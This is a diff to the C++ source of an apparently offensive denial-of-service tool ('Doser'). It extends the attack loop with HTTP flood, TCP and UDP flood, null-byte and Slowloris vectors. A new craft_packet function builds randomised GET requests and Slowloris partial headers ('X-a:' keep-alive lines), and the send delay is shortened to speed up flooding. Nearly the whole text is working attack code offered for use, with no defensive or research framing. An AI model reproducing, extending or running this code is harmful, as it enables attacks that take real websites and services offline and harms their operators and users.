@@ -9,57 +9,53 @@
 #include "Doser.h"
 
 
-void Doser::attack(const int *id) {
+void Doser::attack(const int *id){
     std::vector<int> sockets;
     int x, r;
+    std::vector<bool> packets;
     for (x = 0; x < conf->CONNECTIONS; x++) {
         sockets.push_back(0);
+        packets.push_back(false);
     }
     signal(SIGPIPE, &Doser::broke);
     while(true) {
         static std::string message;
         for (x = 0; x < conf->CONNECTIONS; x++) {
-            switch (sockets[x]){
-                case 0:{
-                    sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
-                    break;
-                }
-                default:break;
+            if(!sockets[x]){
+                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
+                packets[x] = false;
             }
-            switch (conf->vector){
-                case (config::HTTP):{
-                    std::string httpbuffer{};
-                    httpbuffer = std::string{"GET /"} + createStr() + " HTTP/1.0\r\nUser-Agent: "
-                                 + randomizeUserAgent() + " \r\nAccept: */*\r\nConnection: Keep-Alive\r\n\r\n";
-                    message = std::string("Buffer: ") + httpbuffer;
-                    logger->Log(&message, Logger::Info);
-                    r = static_cast<int>(write(sockets[x], httpbuffer.c_str(), static_cast<size_t>(httpbuffer.length())));
-                    break;
-                }
-                case (config::Null):{
-                    r = static_cast<int>(write(sockets[x], "\0", 1));
-                    break;
-                }
-                default:break;
+            if(conf->vector == config::NullTCP | conf->vector == config::NullUDP){
+                r = write_socket(sockets[x], "\0", 1);
+            }else{
+                std::string packet = craft_packet(packets[x]);
+                r = write_socket(sockets[x], packet.c_str(), static_cast<int>(packet.length()));
+                packets[x] = true;
             }
-            switch (r){
-                case -1:{
-                    close(sockets[x]);
-                    sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
-                    break;
-                }
-                default:{
-                    message = std::string("Socket[") + std::to_string(x) + "->"
-                              + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
-                    logger->Log(&message, Logger::Info);
-                    message = std::to_string(*id) + ": Voly Sent";
-                    logger->Log(&message, Logger::Info);
-                }
+
+            if(conf->GetResponse){
+                read_socket(sockets[x]);
+            }
+            if(r == -1){
+                close(sockets[x]);
+                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
+                packets[x] = false;
+            }else{
+                message = std::string("Socket[") + std::to_string(x) + "->"
+                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
+                logger->Log(&message, Logger::Info);
+                message = std::to_string(*id) + ": Voly Sent";
+                logger->Log(&message, Logger::Info);
             }
         }
         message = std::to_string(*id) + ": Voly Sent";
         logger->Log(&message, Logger::Info);
-        usleep(300000);
+        if(conf->vector == config::Slowloris){
+            usleep(10000000);
+        }else{
+            usleep(30000);
+        }
+
     }
 }
 
@@ -115,14 +111,10 @@ void Doser::broke(int) {
 }
 
 std::string Doser::createStr() {
-    unsigned seed = static_cast<unsigned int>(std::chrono::steady_clock::now().time_since_epoch().count());
-    std::default_random_engine engine(seed);
-    std::uniform_int_distribution<int> distribution(0, 20);
-    int string_length =  distribution(engine) + 1;
+    int string_length =  randomInt(0, 20) + 1;
     std::string string{};
     for(int i = 0; i < string_length; ++i){
-        distribution = std::uniform_int_distribution<int>(0, 72);
-        string += (static_cast<char>('0' + distribution(engine)));
+        string += (static_cast<char>('0' + randomInt(0, 72)));
     }
     return string;
 }
@@ -137,18 +129,20 @@ void Doser::run() {
         case config::HTTP:
             logger->Log("Attack Vector: HTTP", Logger::Info);
             break;
-        case config::Null:
-            logger->Log("Attack Vector: Null", Logger::Info);
+        case config::NullTCP:
+            logger->Log("Attack Vector: NullTCP", Logger::Info);
             break;
-        default:break;
-    }
-
-    switch(conf->protocol){
-        case config::TCP:
-            logger->Log("Using TCP Protocol", Logger::Info);
+        case config::NullUDP:
+            logger->Log("Attack Vector: NullUDP", Logger::Info);
             break;
-        case config::UDP:
-            logger->Log("Using UDP Protocol", Logger::Info);
+        case config::UDPFlood:
+            logger->Log("Attack Vector: UDPFlood", Logger::Info);
+            break;
+        case config::TCPFlood:
+            logger->Log("Attack Vector: TCPFlood", Logger::Info);
+            break;
+        case config::Slowloris:
+            logger->Log("Attack Vector: Slowloris", Logger::Info);
             break;
         default:break;
     }
@@ -161,7 +155,6 @@ void Doser::run() {
             default:
                 attack(&x);
         }
-
         usleep(200000);
     }
 }
@@ -172,10 +165,73 @@ Doser::Doser(config *conf, Logger *logger) : conf{conf}, logger{logger} {
 
 std::string Doser::randomizeUserAgent(){
     if(conf->useragents.size() > 1){
-        unsigned seed = static_cast<unsigned int>(std::chrono::steady_clock::now().time_since_epoch().count());
-        std::default_random_engine engine(seed);
-        std::uniform_int_distribution<int> distribution(0, static_cast<int>(conf->useragents.size()));
-        return conf->useragents[distribution(engine)];
+        return conf->useragents[randomInt(0, static_cast<int>(conf->useragents.size()))];
     }
     return conf->useragents[0];
+}
+
+void Doser::read_socket(int socket){
+    char chunk[128];
+    while(read(socket , chunk, 128)){
+        memset(chunk , 0 , 128);
+    }
+}
+
+int Doser::write_socket(int socket, const char *string, int length){
+    return static_cast<int>(write(socket, string, static_cast<size_t>(length)));
+}
+
+std::string Doser::craft_packet(bool keep_alive){
+    std::string packet{};
+    switch(conf->vector){
+        case config::UDPFlood:
+        case config::TCPFlood:
+            return createStr();
+        case config::HTTP:{
+            packet += "GET /";
+            if(conf->RandomizeHeader){
+                packet += createStr();
+            }
+            packet += " HTTP/1.0\r\nUser-Agent: ";
+            if(conf->RandomizeUserAgent){
+                packet += randomizeUserAgent();
+            }else{
+                packet += conf->useragents[0];
+            }
+            packet+= " \r\nAccept: */*\r\nConnection: Keep-Alive\r\n\r\n";
+            return packet;
+        }
+        case config::Slowloris:{
+            if(keep_alive){
+                packet += "X-a: ";
+                packet += std::to_string(randomInt(1, 5000));
+                packet += " \r\n";
+            }else{
+                packet += "GET /";
+                if(conf->RandomizeHeader){
+                    packet += createStr();
+                }
+                packet += " HTTP/1.0\r\nUser-Agent: ";
+                if(conf->RandomizeUserAgent){
+                    packet += randomizeUserAgent();
+                }else{
+                    packet += conf->useragents[0];
+                }
+                packet+= " \r\nAccept: */*\r\n";
+                packet += "X-a: ";
+                packet += std::to_string(randomInt(1, 5000));
+                packet += " \r\n";
+            }
+            return packet;
+        }
+        default:
+            return "";
+    }
+}
+
+int Doser::randomInt(int min, int max){
+    unsigned seed = static_cast<unsigned int>(std::chrono::steady_clock::now().time_since_epoch().count());
+    std::default_random_engine engine(seed);
+    std::uniform_int_distribution<int> distribution(min, max);
+    return distribution(engine);
 }
